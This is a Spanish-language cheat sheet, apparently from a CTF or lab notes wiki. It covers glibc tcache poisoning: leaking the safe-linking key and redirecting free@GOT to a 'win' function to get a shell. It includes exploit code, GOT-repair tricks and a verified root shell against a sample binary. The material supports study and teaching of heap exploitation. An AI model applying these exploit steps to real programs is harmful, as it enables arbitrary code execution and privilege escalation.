# tcache poisoning -> free@GOT = win (cheat sheet)

Camino completo y verificado por ejecucion para pasar de un **UAF en tcache** (menu
new/free/edit/show) a shell SIN leak de libc, en glibc moderna (2.32+, probado contra
**glibc 2.39**). Util cuando hay una funcion regalo `win`/`system("/bin/sh")` y la GOT es
escribible (No/Partial RELRO, no-PIE). Complementa [[got-plt]] y [[heap-pwn]]; aqui estan los
tres detalles que suelen hacer fallar el exploit en silencio.

## Fuga de la clave de safe-linking con un bin VACIO

Safe-linking (2.32+) guarda el `fd` de tcache cifrado: `fd = (pos >> 12) ^ next`, donde `pos`
es la direccion del propio campo `fd` (es decir, la direccion del chunk). No hace falta un leak
de heap-base aparte: al liberar el PRIMER chunk de un bin (su `next` real es NULL), queda
`fd = (pos >> 12) ^ 0 = pos >> 12`. Ese valor ES la clave (`key = &chunk >> 12`).

```python
# new(0); free(0) en bin vacio -> fd = mangle(NULL) = &chunk0 >> 12; show(0) lo imprime.
new(0); free(0)
key = u64(show(0)[:8].ljust(8, b"\x00"))     # key = &chunk0 >> 12  (p.ej. 0x405)
new(0)                                        # recupera el chunk: bin vacio otra vez
# Para envenenar hacia TARGET: fd = key ^ TARGET  (demangle: (pos>>12) ^ fd = TARGET).
```

`show` con `write(1, p, 8)` saca los 8 bytes crudos; con `printf("%s")` se corta en el primer
`\x00`, pero la clave es un valor pequeno (heap >> 12) asi que basta con leer lo que salga y
rellenar a 8 bytes.

## UAF -> free@GOT = win (sin __free_hook, sin leak)

`__free_hook`/`__malloc_hook` fueron eliminados en glibc 2.34, asi que el `free(chunk con
"/bin/sh")` clasico ya no vale. Alternativa que NO necesita libc: envenena el tcache para que
`malloc` devuelva **free@GOT**, y sobrescribe ahi la direccion de la funcion regalo `win`.
Luego cualquier `free(x)` salta a `win` (la PLT hace `jmp *free@GOT`).

```python
# bin con 2 chunks: fd(chunk0) -> free@GOT
new(1); free(1); free(0)                      # tcache: chunk0 -> chunk1  (count 2)
edit(0, p64(key ^ free_got))                  # fd(chunk0) demangle -> free_got
new(2)                                        # saca chunk0; cabeza del bin = free_got
new(3)                                        # saca free_got como "chunk" (chunks[3] = &free@GOT)
# DIAG decisivo: show(3) ANTES de escribir debe dar el free real de libc (0x7f...). Si sale
# pequeno/0, el 2o malloc no devolvio free@GOT (poisoning fallido), no sigas.
edit(3, p64(win))                             # *free@GOT = win
free(2)                                       # free(chunk0) -> jmp *free@GOT -> win()
```

Requisitos: `win` y `free` como simbolos, `free@GOT` escribible (No/Partial RELRO), no-PIE
(si es PIE hay que rebasear). `win` ya hace `system("/bin/sh")`, asi que no hace falta leak.

## El gotcha del key-clear: malloc(GOT) pone a 0 la entrada vecina (+8)

**El fallo silencioso mas comun de este camino.** La mitigacion de doble-free de tcache
(glibc 2.29+) escribe `e->key = 0` en **chunk+8** en CADA asignacion (`tcache_get`). Cuando
`malloc` devuelve `free@GOT` como chunk, eso pone a CERO la entrada GOT contigua
`free@GOT + 8`. Si `win` llama a una funcion de libc a traves de esa entrada (tipicamente
`puts` justo antes del `system`), saltara a `0x0` -> **SIGSEGV con `si_addr=NULL`, sin ningun
mensaje de glibc y sin imprimir nada** (confirmado bajo gdb: `#0 rip=0x0`, `#1 win+puts`).

Fix: `edit` suele permitir >8 bytes, asi que **restaura la vecina en la MISMA escritura**. Su
valor inicial en el fichero ELF es su stub de resolucion perezosa de la PLT (valido para
cualquier `JUMP_SLOT` en Partial RELRO no-PIE):

```python
neigh = free_got + 8                          # la ranura que el key-clear pone a 0
neigh_lazy = u64(elf.read(neigh, 8))          # valor inicial en el ELF = stub PLT perezoso
edit(3, p64(win) + p64(neigh_lazy))           # free@GOT=win Y repara free@GOT+8
# Ahora win->puts resuelve perezosamente y win->system('/bin/sh') da shell.
```

Escribe solo lo imprescindible: cada 8 bytes extra pisan la siguiente ranura GOT
(`write@GOT`, `system@GOT`...). No rellenes con padding "por si acaso".

## Diagnostico cuando "no salta a win"

Instrumenta por fases y distingue CAUSAS, no sintomas:

- **Fusiona stderr** del proceso en el tubo (`process(..., stderr=STDOUT)`): un abort de glibc
  (`free(): ...`, `malloc(): unaligned tcache chunk detected`) se traga si no lo capturas.
- **Lee free@GOT ANTES de escribir** (`show` de la ranura): debe ser el `free` real de libc
  (`0x7f...`). Eso prueba que el poisoning acerto; leer DESPUES solo repite lo que escribiste y
  no prueba nada.
- `si_addr=NULL` + sin abort = salto a una ranura GOT en 0 -> el key-clear (ver arriba).
- Un abort `unaligned tcache chunk` = el objetivo no esta alineado a 16 (una entrada GOT como
  `0x404000` si lo esta; un `TARGET` arbitrario puede no estarlo).

## Alineacion de la pila al llegar a win

Entra en `win` por su ENTRADA (con su `push rbp`), no en medio: llegar via el `call free@plt`
del menu deja `rsp ≡ 8 (mod 16)` en la entrada, y el `push rbp` lo realinea a `≡ 0`, que es lo
que `system`->`do_system`->`movaps` necesita. Saltar PASADO el `push rbp` (p.ej. a `win+N` para
esquivar el `puts`) desalinea la pila y `movaps` casca con SIGSEGV. Si de verdad necesitas
esquivar una llamada, reintroduce un `ret` o un `push` para recuperar la alineacion.

## Referencias

- glibc `malloc/malloc.c`: `tcache_get` -> `e->key = 0` (clear en cada asignacion); `tcache_put`
  usa ese `key` para detectar doble-free. `PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`.
- OWASP Desktop Top 10 DA8 (Poor Code Quality / corrupcion de memoria).
- Verificado en este proyecto por ejecucion contra `samples/bin/heapexp` (glibc 2.39):
  `free@GOT=0x404000`, `win=0x4011c6`, `puts@GOT=0x404008` puesto a 0 por el key-clear;
  reparado -> `[+] win reached` -> `uid=0(root)`.
